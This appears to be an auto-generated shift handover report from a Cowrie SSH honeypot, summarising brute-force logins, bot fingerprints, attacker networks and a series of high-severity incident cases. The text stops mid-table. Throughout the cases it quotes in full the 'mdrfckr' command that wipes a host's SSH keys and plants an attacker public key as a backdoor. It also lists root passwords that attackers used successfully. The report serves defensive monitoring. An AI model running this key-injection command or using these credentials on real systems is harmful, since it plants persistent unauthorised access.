# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-05 |
| **Generated At** | 2026-06-05T23:14:23Z |
| **Shift Time** | 23:14 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **107** |
| Confirmed Threats | **103** |
| False Positives Filtered | **4** (3.7%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **8** |
| High Severity Cases | **44** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **63** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **96** |
| Unique Credential Pairs | **49** |
| Unique Usernames | **29** |
| Unique Passwords | **47** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `345gs5662d34` | 22 |
| `admin` | 2 |
| `magda` | 2 |
| `dev` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `121212` | 2 |
| `123456` | 2 |
| `password` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 22 |
| `admin` | `121212` | 2 |
| `magda` | `magda` | 2 |
| `root` | `Johnny123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qaz@WSX#EDC` | `160.187.180.175` | 2026-06-05T22:07:52 |
| `root` | `3245gs5662d34` | `160.187.180.175` | 2026-06-05T22:07:55 |
| `root` | `cq@123456` | `202.152.201.166` | 2026-06-05T22:44:12 |
| `root` | `3245gs5662d34` | `202.152.201.166` | 2026-06-05T22:44:17 |
| `root` | `Qwe2026` | `202.152.201.166` | 2026-06-05T22:46:28 |
| `root` | `system32` | `202.152.201.166` | 2026-06-05T22:46:49 |
| `root` | `He123456` | `202.152.201.166` | 2026-06-05T22:47:32 |
| `root` | `5tgb^YHN` | `202.152.201.166` | 2026-06-05T22:49:17 |
| `root` | `Huawei@321` | `202.152.201.166` | 2026-06-05T22:50:01 |
| `root` | `Qazwsx123!!` | `202.152.201.166` | 2026-06-05T22:50:41 |
| `root` | `abcABC@123` | `202.152.201.166` | 2026-06-05T22:51:23 |
| `root` | `123...` | `45.120.216.232` | 2026-06-05T22:53:32 |
| `root` | `3245gs5662d34` | `45.120.216.232` | 2026-06-05T22:53:36 |
| `root` | `qwerty` | `202.152.201.166` | 2026-06-05T22:53:53 |
| `root` | `www.163.com` | `202.152.201.166` | 2026-06-05T22:54:14 |
| `root` | `Johnny123` | `45.120.216.232` | 2026-06-05T22:55:29 |
| `root` | `Johnny123` | `203.121.40.210` | 2026-06-05T22:57:21 |
| `root` | `3245gs5662d34` | `203.121.40.210` | 2026-06-05T22:57:23 |
| `root` | `Mg123` | `203.121.40.210` | 2026-06-05T22:59:21 |
| `root` | `@dm1n2026` | `45.120.216.232` | 2026-06-05T23:01:12 |
| `root` | `Admin2025*` | `45.120.216.232` | 2026-06-05T23:03:00 |
| `root` | `zm123456` | `45.120.216.232` | 2026-06-05T23:04:50 |
| `root` | `147258369` | `203.121.40.210` | 2026-06-05T23:05:29 |
| `root` | `Ss123123` | `203.121.40.210` | 2026-06-05T23:07:38 |
| `root` | `Asd@12345` | `203.121.40.210` | 2026-06-05T23:09:43 |
| `root` | `Asd@12345` | `45.120.216.232` | 2026-06-05T23:10:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **107** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 101 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 52 | 4 |
| `03a80b21afa8...` | Modern SSH client | 49 | 5 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 52 | 4 | Mirai/variant |
| `03a80b21afa8...` | libssh | 49 | 5 | Modern SSH client |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 22 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `160.187.180.175`, `45.120.216.232`, `203.121.40.210`, `202.152.201.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **12** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS9930` | TTNET | 1 | HIGH |
| `AS134366` | Cloud Computing HK Limited | 1 | HIGH |
| `AS63859` | PT. Eka Mas Republik | 1 | HIGH |
| `AS132124` | Information and Communication Technology Agency of Sri Lanka | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS134761` | CHINANET NINGXIA province ZHONGWEI IDC network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (44)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4df17a4a4b96

| Field | Detail |
|---|---|
| **Source IP** | `160.187.180[.]175` |
| **First Seen** | 2026-06-05 22:07 |
| **Last Seen** | 2026-06-05 22:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:07:52` | `cowrie.session.connect` |
| `2026-06-05 22:07:52` | `cowrie.client.version` |
| `2026-06-05 22:07:52` | `cowrie.client.kex` |
| `2026-06-05 22:07:52` | `cowrie.login.success` |
| `2026-06-05 22:07:52` | `cowrie.session.params` |
| `2026-06-05 22:07:52` | `cowrie.command.input` |
| `2026-06-05 22:07:52` | `cowrie.command.failed` |
| `2026-06-05 22:07:53` | `cowrie.log.closed` |
| `2026-06-05 22:07:53` | `cowrie.session.params` |
| `2026-06-05 22:07:53` | `cowrie.command.input` |
| `2026-06-05 22:07:53` | `cowrie.session.file_download` |
| `2026-06-05 22:07:53` | `cowrie.log.closed` |
| `2026-06-05 22:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.187.180[.]175` to AbuseIPDB if not already reported
- [ ] Block `160.187.180[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3332e6100247

| Field | Detail |
|---|---|
| **Source IP** | `160.187.180[.]175` |
| **First Seen** | 2026-06-05 22:07 |
| **Last Seen** | 2026-06-05 22:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:07:54` | `cowrie.session.connect` |
| `2026-06-05 22:07:54` | `cowrie.client.version` |
| `2026-06-05 22:07:54` | `cowrie.client.kex` |
| `2026-06-05 22:07:55` | `cowrie.login.success` |
| `2026-06-05 22:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.187.180[.]175` to AbuseIPDB if not already reported
- [ ] Block `160.187.180[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a32bb355d0b

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:44 |
| **Last Seen** | 2026-06-05 22:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:44:11` | `cowrie.session.connect` |
| `2026-06-05 22:44:11` | `cowrie.client.version` |
| `2026-06-05 22:44:11` | `cowrie.client.kex` |
| `2026-06-05 22:44:12` | `cowrie.login.success` |
| `2026-06-05 22:44:12` | `cowrie.session.params` |
| `2026-06-05 22:44:12` | `cowrie.command.input` |
| `2026-06-05 22:44:12` | `cowrie.command.failed` |
| `2026-06-05 22:44:13` | `cowrie.log.closed` |
| `2026-06-05 22:44:13` | `cowrie.session.params` |
| `2026-06-05 22:44:13` | `cowrie.command.input` |
| `2026-06-05 22:44:13` | `cowrie.session.file_download` |
| `2026-06-05 22:44:13` | `cowrie.log.closed` |
| `2026-06-05 22:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-881cd6a70a0f

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:44 |
| **Last Seen** | 2026-06-05 22:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:44:16` | `cowrie.session.connect` |
| `2026-06-05 22:44:16` | `cowrie.client.version` |
| `2026-06-05 22:44:16` | `cowrie.client.kex` |
| `2026-06-05 22:44:17` | `cowrie.login.success` |
| `2026-06-05 22:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c35815a23f

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:46 |
| **Last Seen** | 2026-06-05 22:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:46:27` | `cowrie.session.connect` |
| `2026-06-05 22:46:27` | `cowrie.client.version` |
| `2026-06-05 22:46:27` | `cowrie.client.kex` |
| `2026-06-05 22:46:28` | `cowrie.login.success` |
| `2026-06-05 22:46:28` | `cowrie.session.params` |
| `2026-06-05 22:46:28` | `cowrie.command.input` |
| `2026-06-05 22:46:28` | `cowrie.command.failed` |
| `2026-06-05 22:46:29` | `cowrie.log.closed` |
| `2026-06-05 22:46:29` | `cowrie.session.params` |
| `2026-06-05 22:46:29` | `cowrie.command.input` |
| `2026-06-05 22:46:29` | `cowrie.session.file_download` |
| `2026-06-05 22:46:29` | `cowrie.log.closed` |
| `2026-06-05 22:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda58a1335d8

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:46 |
| **Last Seen** | 2026-06-05 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:46:32` | `cowrie.session.connect` |
| `2026-06-05 22:46:32` | `cowrie.client.version` |
| `2026-06-05 22:46:32` | `cowrie.client.kex` |
| `2026-06-05 22:46:32` | `cowrie.login.success` |
| `2026-06-05 22:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba802d989e3

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:46 |
| **Last Seen** | 2026-06-05 22:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:46:48` | `cowrie.session.connect` |
| `2026-06-05 22:46:48` | `cowrie.client.version` |
| `2026-06-05 22:46:49` | `cowrie.client.kex` |
| `2026-06-05 22:46:49` | `cowrie.login.success` |
| `2026-06-05 22:46:50` | `cowrie.session.params` |
| `2026-06-05 22:46:50` | `cowrie.command.input` |
| `2026-06-05 22:46:50` | `cowrie.command.failed` |
| `2026-06-05 22:46:50` | `cowrie.log.closed` |
| `2026-06-05 22:46:50` | `cowrie.session.params` |
| `2026-06-05 22:46:50` | `cowrie.command.input` |
| `2026-06-05 22:46:51` | `cowrie.session.file_download` |
| `2026-06-05 22:46:51` | `cowrie.log.closed` |
| `2026-06-05 22:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d222405cf9e

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:46 |
| **Last Seen** | 2026-06-05 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:46:53` | `cowrie.session.connect` |
| `2026-06-05 22:46:53` | `cowrie.client.version` |
| `2026-06-05 22:46:53` | `cowrie.client.kex` |
| `2026-06-05 22:46:54` | `cowrie.login.success` |
| `2026-06-05 22:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4190d63bc86b

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:47 |
| **Last Seen** | 2026-06-05 22:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:47:31` | `cowrie.session.connect` |
| `2026-06-05 22:47:31` | `cowrie.client.version` |
| `2026-06-05 22:47:31` | `cowrie.client.kex` |
| `2026-06-05 22:47:32` | `cowrie.login.success` |
| `2026-06-05 22:47:32` | `cowrie.session.params` |
| `2026-06-05 22:47:32` | `cowrie.command.input` |
| `2026-06-05 22:47:32` | `cowrie.command.failed` |
| `2026-06-05 22:47:32` | `cowrie.log.closed` |
| `2026-06-05 22:47:33` | `cowrie.session.params` |
| `2026-06-05 22:47:33` | `cowrie.command.input` |
| `2026-06-05 22:47:33` | `cowrie.session.file_download` |
| `2026-06-05 22:47:33` | `cowrie.log.closed` |
| `2026-06-05 22:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e084144f79e5

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:47 |
| **Last Seen** | 2026-06-05 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:47:35` | `cowrie.session.connect` |
| `2026-06-05 22:47:35` | `cowrie.client.version` |
| `2026-06-05 22:47:35` | `cowrie.client.kex` |
| `2026-06-05 22:47:36` | `cowrie.login.success` |
| `2026-06-05 22:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3b0a837704

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:49 |
| **Last Seen** | 2026-06-05 22:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:49:17` | `cowrie.session.connect` |
| `2026-06-05 22:49:17` | `cowrie.client.version` |
| `2026-06-05 22:49:17` | `cowrie.client.kex` |
| `2026-06-05 22:49:17` | `cowrie.login.success` |
| `2026-06-05 22:49:18` | `cowrie.session.params` |
| `2026-06-05 22:49:18` | `cowrie.command.input` |
| `2026-06-05 22:49:18` | `cowrie.command.failed` |
| `2026-06-05 22:49:18` | `cowrie.log.closed` |
| `2026-06-05 22:49:18` | `cowrie.session.params` |
| `2026-06-05 22:49:18` | `cowrie.command.input` |
| `2026-06-05 22:49:19` | `cowrie.session.file_download` |
| `2026-06-05 22:49:19` | `cowrie.log.closed` |
| `2026-06-05 22:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95bfedbbf85d

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:49 |
| **Last Seen** | 2026-06-05 22:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:49:21` | `cowrie.session.connect` |
| `2026-06-05 22:49:21` | `cowrie.client.version` |
| `2026-06-05 22:49:21` | `cowrie.client.kex` |
| `2026-06-05 22:49:22` | `cowrie.login.success` |
| `2026-06-05 22:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8217383f8e74

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:50 |
| **Last Seen** | 2026-06-05 22:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
